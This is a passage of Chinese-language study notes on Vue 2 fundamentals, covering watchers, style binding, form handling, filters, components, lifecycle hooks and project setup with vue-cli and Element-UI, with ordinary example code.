                console.log(`numbers.a监视器, newValue = ${val}, oldValue = ${oldVal}`);
            }
        }
    }
})
vm.$watch('numbers.b', function (val, oldVal) {
    console.log(`numbers.b监视器, newValue = ${val}, oldValue = ${oldVal}`);
})
```
**监视器对比计算属性**：

computed和watch之间的区别：
-   computed能完成的功能，watch都可以完成。
-   watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。

两个重要的小原则：
-   所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
-   所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。
```javascript
const vm = new Vue({
    el: '#app',
    data: {
        firstName: '张',
        lastName: '三',
        fullName: '张-三'
    },
    watch: {
        // 监视姓名的修改，然后改变全名
        firstName: {
            handler(val) {
                this.fullName = val + '-' + this.lastName;
            }
        },
        lastName(val) {
            // 监视器可以设置异步操作，2秒后再完成值更新
            setTimeout(() => {
                // 这里的this是vue实例对象
                console.log(this);
                this.fullName = this.firstName + '-' + val;
            }, 2000);
        }
    },
    computed: {
        // 计算属性不能设置异步
        test() {
            return this.firstName + '-' + this.lastName;
        }
    }
})
```

## 样式绑定

-   class样式，写法`:class="xxx"` xxx可以是字符串、对象、数组。
    -   字符串写法适用于：类名不确定，要动态获取。
    -   对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
    -   数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
-   style样式
    -   `:style="{fontSize: xxx}"`其中xxx是动态值。
    -   `:style="[a,b]"`其中a、b是样式对象。

```javascript
<div id="app">
<!--:class 绑定class样式字符串写法 适用于样式的类名不确定，需要动态指定-->
<div class="basic" :class="mood" @click="changeMood">{{name}}</div><br /><br />

<!--:class 绑定class样式数组写法 适用于样式个数不确定，名字也不确定的状况-->
<div class="basic" :class="moodArr">{{name}}</div><br /><br />

<!--:class 绑定class样式对象写法 适用于要绑定的样式个数确定，名字确定，但动态决定要不要用的状况-->
<div class="basic" :class="moodObj">{{name}}</div><br /><br />

<!-- 绑定style样式--对象写法 -->
<div class="basic" :style="styleObj">{{name}}</div><br /><br />

<!-- 绑定style样式--数组写法 -->
<div class="basic" :style="[styleObj, styleObj1]">{{name}}</div><br /><br />

<!-- 绑定style样式--数组写法2 -->
<div class="basic" :style="styleArr">{{name}}</div>
</div>
<script>
const vm = new Vue({
    el: '#app',
    data: {
        name: '张三',
        mood: 'normal',
        moodArr: ['test01', 'test02', 'test03'],
        // true或者false表示是否使用该样式
        moodObj: {
            test01: false,
            test02: false,
            test03: true
        },
        styleObj: {
            fontSize: '50px',
            color: 'red'
        },
        styleObj1: {
            backgroundColor: 'blue'
        },
        styleArr: [
            {
                fontSize: '40px',
                color: 'skyblue'
            },
            {
                backgroundColor: 'yellowgreen'
            }
        ]
    },
    methods: {
        changeMood() {
            // 非框架旧写法
            // document.getElementById('basic').className='basic happy';
            let arr = ['normal', 'happy', 'sad'];
            let index = Math.floor(Math.random() * 3);
            console.log(`index = ${index}`);
            this.mood = arr[index];
        }
    }
})
</script>
```

## 收集表单数据

input类型的注意点
-   `<input type="text"/>`，则v-model收集的是value值，用户输入的就是value值。
-   `<input type="radio"/>`，则v-model收集的是value值，且要给标签配置value值。
-   `<input type="checkbox"/>`
    -   没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
    -   配置input的value属性:
        -   v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
        -   v-model的初始值是数组，那么收集的的就是value组成的数组
-   v-model的三个修饰符：
    -   lazy：失去焦点再收集数据
    -   number：输入字符串转为有效的数字
    -   trim：输入首尾空格过滤

```javascript
    <div id="app">
        <!-- form内置验证，有submit提交并刷新页面，可以使用prevent阻止刷新页面的事件 -->
        <form @submit.prevent="demo">
            <label for="accountInput">账号：</label>
            <input type="text" id="accountInput" v-model.trim="userInfo.account"><br><br>
            密码：<input type="password" v-model="userInfo.password"><br><br>
            性别：
            男<input type="radio" name="gender" value="male" v-model="userInfo.gender">
            女<input type="radio" name="gender" value="female" v-model="userInfo.gender"><br><br>
            年龄：<input type="number" v-model.number="userInfo.age"><br><br>
            爱好：
            吃饭<input type="checkbox" name="hobby" v-model="userInfo.hobby" value="eat">
            睡觉<input type="checkbox" name="hobby" v-model="userInfo.hobby" value="sleep">
            玩游戏<input type="checkbox" name="hobby" v-model="userInfo.hobby" value="game"><br><br>
            所属校区：
            <select v-model="userInfo.city">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="guangzhou">广州</option>
            </select><br><br>
            其他信息：
            <textarea v-model.lazy="userInfo.other"></textarea><br><br>
            <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="https://www.baidu.com">《用户协议》</a><br><br>
            <button>提交</button>
        </form>
    </div>
    <script>
        const vm = new Vue({
            el: '#app',
            data: {
                userInfo: {
                    account: '',
                    password: '',
                    gender: '',
                    age: '',
                    hobby: [],
                    city: '',
                    other: '',
                    agree: ''
                }
            },
            methods: {
                demo() {
                    console.log(JSON.stringify(this._data.userInfo));
                    console.log(JSON.stringify(this.userInfo));
                }
            },
        });
    </script>
```


## 过滤器filter

-   定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
-   语法：
    - 注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
    - 使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"，注意不能在v-model绑定的属性使用
-   备注：
    -   过滤器也可以接收额外参数、多个过滤器也可以串联
    -   并没有改变原本的数据, 是产生新的对应的数据

```javascript
    <div id='app'>
        <h1>显示格式化后的时间</h1>
        <h2>计算属性实现,当前时间为：{{ fmtDate }}</h2>
        <h2>js方法实现,当前时间为：{{ getFmtDate() }}</h2>
        <h2>过滤器实现1,当前时间为：{{ time | timeFormater}}</h2>
        <!-- 多次过滤 time 传参timeFormater 之后的返回值，再传参 mySlice -->
        <h2>过滤器实现2,当前年份为：{{ time | timeFormater | mySlice}}</h2>
    </div>
    <!-- 能够直接使用全局过滤器，但不能使用局部过滤器 -->
    <div id="app2">
        <h2>测试全局过滤器：{{ msg | mySlice}}</h2>
    </div>
    <script>
        // 全局过滤器要在Vue实例之前配置
        Vue.filter('mySlice', function (val) {
            return val.slice(0, 4)
        })
        const vm = new Vue({
            el: '#app',
            data: {
                time: Date.now()
            },
            computed: {
                fmtDate() {
                    return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
                }
            },
            methods: {
                getFmtDate() {
                    return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
                }
            },
            // 局部过滤器
            filters: {
                timeFormater(val, str = 'YYYY-MM-DD HH:mm:ss') {
                    return dayjs(val).format(str)
                }
            }
        })
        const vm2 = new Vue({
            el:'#app2',
            data:{
                msg:'hello'
            }
        })
    </script>
```

## 组件化
### 使用组件步骤
Vue中使用组件的三大步骤：定义组件(创建组件)，注册组件，使用组件(写组件标签)

-   如何定义一个组件？
        使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
        区别如下：
    -   el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
    -   data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
    备注：使用template可以配置组件结构。

-   如何注册组件？
        1.局部注册：靠new Vue的时候传入components选项
        2.全局注册：靠Vue.component('组件名',组件)

-   编写组件标签：`<school></school>`

### 几个注意点：
-   关于组件名:
    -   一个单词组成：
        第一种写法(首字母小写)：school
        第二种写法(首字母大写)：School
    -   多个单词组成：
        -   第一种写法(kebab-case命名)：`my-school`
        -   第二种写法(CamelCase命名)：`MySchool` (需要Vue脚手架支持)
    -   备注：
        -   组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
        -   可以使用name配置项指定组件在开发者工具中呈现的名字。

    -   关于组件标签:
            第一种写法：<school></school>
            第二种写法：<school/>
            备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。

    -   一个简写方式：
            `const school = Vue.extend(options)` 可简写为：`const school = options`
-   [代码](https://github.com/zengten/Learn-Front-End/blob/main/vue-base/34-component-base.html)

```javascript
    <div id="app">
        <button @click="count++">点击了{{count}}次</button>
        <!-- 使用全局组件，注意标签里面的驼峰命令转化为横杠 -->
        <global-counter></global-counter>
        <!-- 下面的标签会直接报错 -->
        <!-- <globalCounter></globalCounter> -->
        <!-- 使用局部组件 -->
        <my-counter></my-counter>
    </div>
    <script>
        // 注册一个全局组件
        Vue.component("globalCounter", {
            template: `<button v-on:click="count++">点击了{{count}}次</button>`,
            // 注意组件是data方法，并且返回一个对象{}
            data() {
                return {
                    count: 1
                }
            }
        });

        // 定义一个局部组件
        const localCounter = {
            template: `<button @click="count++">点击了{{count}}次</button>`,
            data() {
                return {
                    count: 1
                }
            }
        }

        let vm = new Vue({
            // 注意局部组件要绑定元素使用
            el: '#app',
            data: {
                // 第一个标签数据
                count: 1
            },
            components: {
                // k : v 形式
                'myCounter': localCounter
            }
        })
    </script>
```

### Vue实例和组件实例

-   关于VueComponent：
    -   school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
    -   我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。
    -   特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！注意这一点很重要
    -   关于this指向：
        -   组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
        -   new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。
    -   VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
            Vue的实例对象，以后简称vm。 vm管理着一个又一个vc。
    -   因为组件是可复用的 Vue 实例，所以它们与 new Vue 接收相同的选项，例如 data、computed、watch、methods 以及生命周期钩子等。仅有的例外是像 el 这样根实例特有的选项。所以vm与vc属性配置并不是一模一样，尽管vc底层复用了很多vm的逻辑

-   原型
    -   一个重要的内置关系：`VueComponent.prototype.__proto__ === Vue.prototype`
    -   为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

-   [代码](https://github.com/zengten/Learn-Front-End/blob/main/vue-base/35-component-nested.html)

<img src="/img/Vue和VueComponent之间内置关系分析图.png" alt="Vue和VueComponent之间内置关系分析图" title="Vue和VueComponent之间内置关系分析图"/>

## 路由

```javascript
<!-- 跳转到hello页面 -->
<router-link to="hello">去hello</router-link>
```



## 生命周期

生命周期：
-   又名：生命周期回调函数、生命周期函数、生命周期钩子。
-   是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
-   生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
-   生命周期函数中的this指向是vm 或 组件实例对象。

常用的生命周期钩子：
-   mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
-   beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

关于销毁Vue实例
-   销毁后借助Vue开发者工具看不到任何信息。
-   销毁后自定义事件会失效，但原生DOM事件依然有效。(click之类的原生事件依然会被调用[新版本vue也移除了原生事件])
-   一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。

[代码](https://github.com/zengten/Learn-Front-End/tree/main/vue-base/33-lifecycle.html)

<img src="/img/生命周期.png" alt="生命周期" title="生命周期"/>

## 构建vue demo

### 安装webpack

```shell
// 全局安装指定版本，不容易出问题
npm install webpack@4.41.2 -g
```

### 安装vue-cli

```shell
// 全局安装指定版本
// vue-cli已经停止维护，后续可用vite
npm install --global vue-cli
// 卸载命令
npm uninstall -g vue/cli
```

### 初始化项目

```shell
# 使用命令初始化vue-demo项目
vue init webpack vue-demo
# 启动项目
npm run dev
```

## Element-UI

### 安装

```shell
npm i element-ui
```

### 导入

```javascript
// 导入element-ui和css
import ElementUI from 'element-ui'
import 'element-ui/lib/theme-chalk/index.css';
// 使用
Vue.use(ElementUI);
```

